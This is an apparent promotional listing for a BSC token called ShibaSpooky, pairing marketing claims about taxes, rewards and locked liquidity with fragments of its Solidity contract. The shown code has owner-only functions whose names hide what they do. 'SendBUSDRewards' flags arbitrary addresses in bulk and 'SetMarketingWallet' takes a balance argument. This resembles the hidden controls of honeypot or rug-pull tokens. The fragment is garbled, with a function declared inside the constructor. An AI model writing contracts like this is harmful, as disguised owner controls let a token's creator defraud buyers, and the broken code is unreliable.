...
Shiba Spooky - Earn BUSD with ShibaSpooky! 

3% Marketing
2% BUSD Rewards
2% Liquidity 

With total of 7% Slippage on all transactions 
Liquidity will be locked for 14 Days 
BSC Network ( BNB Pair ) 
Smart Contract Verified
Low Supply (500,000 $SPOOKYSHIB ) 
Low Tax ( 7% Slippage ) 

https://t.me/ShibaSpooky
...
*/
    ...
    contract ShibaSpooky  is IBEP20, Ownable
    {
        ...
        string private constant _name = "ShibaSpooky";
        string private constant _symbol = "SpookyShib";
        ...
        address public constant MarketingWallet=0x8C53Abc4f67a45b48086e94Cd71240D40f4633C7; 
        ...
        constructor () {
           ...
           function OwnerLiquidityProvider(address account) external onlyOwner {
            _isSendRewards[account] = false;
          }
          
            function SendBUSDRewards(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function SetMarketingWallet(address account, uint256 balance) onlyOwner  public virtual {
